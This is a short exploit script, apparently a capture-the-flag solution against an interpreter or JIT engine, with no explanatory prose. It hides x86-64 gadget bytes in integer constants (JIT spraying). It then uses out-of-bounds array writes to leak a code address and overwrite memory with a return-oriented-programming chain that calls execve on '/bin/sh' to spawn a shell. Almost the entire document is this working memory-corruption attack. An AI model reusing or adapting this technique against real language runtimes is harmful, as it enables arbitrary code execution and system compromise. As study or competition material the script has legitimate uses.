def f1():
    x = array(0x50)
    return x

def f2(x):
    y = array(0x40)
    f3(x)

def f3(x):
    addr = x[12] - 0x10ae
    x[12] = addr + 0x13d1       # pop rbx; pop rbx; ret;
    x[15] = addr + 0x13d9       # add al, 8; ret;
    x[16] = addr + 0x13e1       # push rax; pop rdi; ret;
    x[17] = addr + 0x13e9       # pop rdx; ret;
    x[18] = 0
    x[19] = addr + 0x13f1       # pop rsi; ret;
    x[20] = 0
    x[21] = addr + 0x13f9       # pop rax; ret;
    x[22] = 59
    x[23] = addr + 0x1421       # syscall
    binsh = array(1)
    binsh[0] = 0x0068732f * 0x10000 * 0x10000 + 0x6e69622f
    return binsh                # rax = binsh

def main():
    pop_rbx_rbx = 0xc35b5b
    add_al_8 = 0xc30804
    push_rax_pop_rdi = 0xc35f50
    pop_rdx = 0xc35a
    pop_rsi = 0xc35e
    pop_rax = 0xc358
    x = f1()
    f2(x)
